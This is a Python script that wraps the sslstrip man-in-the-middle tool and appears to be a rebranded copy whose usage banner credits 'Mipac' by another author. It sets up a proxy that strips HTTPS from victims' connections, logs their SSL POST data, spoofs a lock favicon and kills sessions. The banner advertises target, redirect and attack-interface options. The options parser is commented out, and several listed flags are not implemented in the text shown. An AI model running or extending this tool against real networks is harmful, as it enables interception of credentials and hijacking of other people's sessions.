#!/usr/bin/env python

"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""

__author__ = "Moxie Marlinspike"
__email__ = "moxie@thoughtcrime.org"
__license__ = """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

import sslstrip.StrippingProxy as StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os

gVersion = "1.0"


class Strip():

    def __init__(self):
        pass

    def usage(self):
        print("\nMipac " + gVersion + " by Omar Ashraf")
        print("Usage: python Packet-sniffer.py <options>\n")
        print("Options:")
        print("-w <filename>, --write=<filename> Specify file to log to (optional).")
        print("-p , --post                       Log only SSL POSTs. (default)")
        print("-s , --ssl                        Log all SSL traffic to and from server.")
        print("-a , --all                        Log all SSL and HTTP traffic to and from server.")
        print("-l <port>, --listen=<port>        Port to listen on (default 80).")
        print("-f , --favicon                    Substitute a lock favicon on secure requests.")
        print("-k , --killsessions               Kill sessions in progress.")
        print("-h, --help                        Print this help message.")
        print("-r, --redirect                    Enter redirect IP, Must Specify a target First")
        print("-t, --target_ip                   Specify Target IP")
        print("-i, --iface                       Specify The Network Interface of the Attck")

    # def parseOptions(self, argv):
    #     self.logFile = 'sslstrip.log'
    #     self.logLevel = logging.WARNING
    #     self.listenPort = 10000
    #     self.spoofFavicon = False
    #     self.killSessions = False
    #
    #     try:
    #         opts, args = getopt.getopt(argv, "hw:l:psafk",
    #                                    ["help", "write=", "post", "ssl", "all", "listen=",
    #                                     "favicon", "killsessions"])
    #
    #         for opt, arg in opts:
    #             if opt in ("-h", "--help"):
    #                 self.usage()
    #                 sys.exit()
    #             elif opt in ("-w", "--write"):
    #                 self.logFile = arg
    #             elif opt in ("-p", "--post"):
    #                 self.logLevel = logging.WARNING
    #             elif opt in ("-s", "--ssl"):
    #                 self.logLevel = logging.INFO
    #             elif opt in ("-a", "--all"):
    #                 self.logLevel = logging.DEBUG
    #             elif opt in ("-l", "--listen"):
    #                 self.listenPort = arg
    #             elif opt in ("-f", "--favicon"):
    #                 self.spoofFavicon = True
    #             elif opt in ("-k", "--killsessions"):
    #                 self.killSessions = True
    #
    #         return self.logFile, self.logLevel, self.listenPort, self.spoofFavicon, self.killSessions
    #
    #     except getopt.GetoptError:
    #         self.usage()
    #         sys.exit(2)

    def start(self, logFile, logLevel, listenPort, spoofFavicon, killSessions):

        logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                            filename=logFile, filemode='w')

        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)

        strippingFactory = http.HTTPFactory(timeout=10)
        strippingFactory.protocol = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        print("\nsslstrip " + gVersion + " by Moxie Marlinspike running...")
        reactor.run()